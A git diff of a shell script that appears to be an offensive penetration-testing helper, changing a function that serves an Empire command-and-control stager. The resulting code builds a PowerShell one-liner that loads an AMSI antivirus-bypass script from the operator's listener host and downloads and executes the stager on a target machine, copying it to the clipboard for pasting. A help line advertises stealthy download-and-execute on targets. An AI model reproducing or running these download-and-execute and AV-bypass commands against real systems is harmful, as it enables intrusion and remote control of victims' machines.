@@ -14,7 +14,7 @@ Commands
 --------
 nb-srv-install          install dependencies
 nb-srv-file-download    copy command to download a payload into a target machine
-nb-srv-empire-stager    use commands to stealthy download and execute empire stager into a target machine
+nb-srv-empire-stager    use commands to stealthy download and execute empire stager in a target machine
 nb-srv-web              hosts a python web server in current dir
 nb-srv-ftp              hosts a python ftp server in current dir
 nb-srv-smb              hosts an impacket smb server in current dir
@@ -84,26 +84,16 @@ nb-srv-empire-stager() {
     local dp=$(__menu $(find /var/lib/powershell-empire/empire/client/generated-stagers/ -type f -printf "%P\n"))
     __ok "Selected: ${dp}"
 
-    # Modify the bat file so that it just has the Base64 string in it by deleting everything up to Base64 string
-    # This code will grab the Base64 string out of the file and save it in a file called =dropper=:
-    cat "$dp" | grep enc | tr " " "\n" | egrep -e '\S{30}+' > "$HOME/desktop/server/dropper"
-    __info "Stager \"dropper\" encoded."
-
     # Download the stager and bypass AV
-    # Load our AMSI bypass script
-    # Load the Base64 string from the server into the variable "$a", and then convert that from Base64 using FromBase64String
-    # This command should hang, and we should see output on our Kali box in Empire.
     local __COMMAND
     __COMMAND="
 iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/amsi.ps1)
-\$a = iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/dropper
-\$b = [System.Convert]::FromBase64String($a)
-iex([System.Text.Encoding]::Unicode.GetString($b))
+iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/${dp})
 "
 
     # Copy the commands to clipboard
     echo "$__COMMAND" | wl-copy
-    __info "Commands to download the \"dropper\" copied to clipboard."
+    __info "Commands to download the stager copied to clipboard."
 
     # Run the server
     echo
